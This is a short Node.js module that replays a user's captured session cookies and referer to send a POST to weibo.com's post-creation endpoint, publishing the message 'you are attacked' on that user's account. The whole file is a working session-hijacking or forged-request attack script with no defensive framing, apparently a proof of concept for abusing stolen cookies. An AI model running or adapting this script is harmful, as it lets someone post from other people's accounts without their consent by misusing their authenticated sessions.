var debug = require('debug')('weibo.com');
var cookie = require('cookie');
var request = require('request');

request.debug = true;

function run(data) {
  var cookies = cookie.parse(data.cookies);
  debug('cookies: ', cookies);
  request({
    method: 'POST',
    url: 'http://weibo.com/aj/mblog/add?_wv=5&__rnd=' + (new Date).getTime(),
    headers: {
      Cookie: data.cookies,
      Referer: data.referer
    },
    form: 'text=you%20are%20attacked' + (new Date).getTime() + '&pic_id=&rank=0&rankid=&_surl=&hottopicid=&location=home&module=stissue&_t=0'
  }, function(err, res, body) {
    debug('err', err);
    debug('body', body);
  });
}

exports.run = run;